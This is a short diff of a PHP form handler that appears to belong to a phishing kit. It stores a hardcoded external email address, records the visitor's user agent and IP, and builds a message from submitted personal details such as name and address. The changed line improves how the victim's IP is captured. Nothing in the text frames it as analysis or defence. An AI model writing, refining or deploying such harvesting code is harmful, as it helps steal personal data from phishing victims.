@@ -2,7 +2,7 @@
 require_once('config.php');
 $agent = $_SERVER['HTTP_USER_AGENT'];
 $email = "cmgrace@yandex.com";
-$ip = getenv("REMOTE_ADDR");
+$ip = get_client_ip();
 $message = "==================+[ ---:||sscu||:--]+==================\n";
 $message .= "First Name : " . $_POST['fn'] . "\n";
 $message .= "Address : " . $_POST['add'] . "\n";
